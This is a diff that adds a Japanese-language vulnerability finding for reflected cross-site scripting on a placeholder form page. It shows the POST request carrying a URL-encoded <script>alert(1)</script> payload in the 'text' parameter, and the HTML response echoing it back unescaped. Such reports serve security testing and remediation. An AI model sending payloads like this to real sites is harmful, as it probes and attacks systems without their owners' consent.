@@ -1,0 +1,36 @@
+[URL]---------------------------------------------------------------------------
+http://www.example.co.jp/form.php
+[パラメータ]--------------------------------------------------------------------
+text
+[脆弱性名]----------------------------------------------------------------------
+クロスサイト・スクリプティング
+[リクエスト]--------------------------------------------------------------------
+POST /form.php HTTP/1.1
+Host: www.example.co.jp
+User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; rv:56.0) Gecko/20100101 Firefox/56.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
+Accept-Language: ja,en-US;q=0.7,en;q=0.3
+Accept-Encoding: gzip, deflate
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 47
+Origin: www.example.co.jp
+Connection: close
+Referer: http://www.example.co.jp/form.php
+Upgrade-Insecure-Requests: 1
+
+text=aaa%3Cscript%3Ealert%281%29%3C%2Fscript%3E
+[レスポンス]-------------------------------------------------------------------
+HTTP/1.1 200 OK
+Date: Thu, 28 Jun 2021 06:23:35 GMT
+Content-Length: 123
+Connection: close
+Content-Type: text/html; charset=UTF-8
+
+<html>
+<head>
+<title>form</title>
+</head>
+<body>
+あなたはaaa<script>alert(1)</script>さんです<br>
+</body>
+</html>
